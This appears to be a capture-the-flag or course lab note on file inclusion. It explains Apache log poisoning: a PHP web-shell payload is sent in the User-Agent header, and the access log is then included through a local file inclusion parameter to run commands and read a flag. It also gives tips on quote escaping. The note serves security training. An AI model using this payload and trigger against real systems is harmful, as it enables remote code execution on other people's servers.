# Module 23 — File Inclusion
## Section 8: Log Poisoning

**Gotcha:** Apache escapes embedded double-quotes `"` in the logged `User-Agent` string, which breaks a double-quoted PHP payload. Use single quotes instead. Also: a corrupted/stale log entry from earlier failed attempts can keep breaking every subsequent include — reset the target (fresh log) before retrying.

**Payload (as User-Agent header):**
```
<?php system($_GET['cmd']); ?>
```
(single-quoted PHP, sent as the `User-Agent` on any request so it lands in `access.log`)

**Trigger via LFI:**
```
?page=/var/log/apache2/access.log&cmd=cat+/path/to/flag
```

**Flag** found by poisoning the Apache access log with a PHP payload via the User-Agent header, then including that log file through the LFI to execute it.
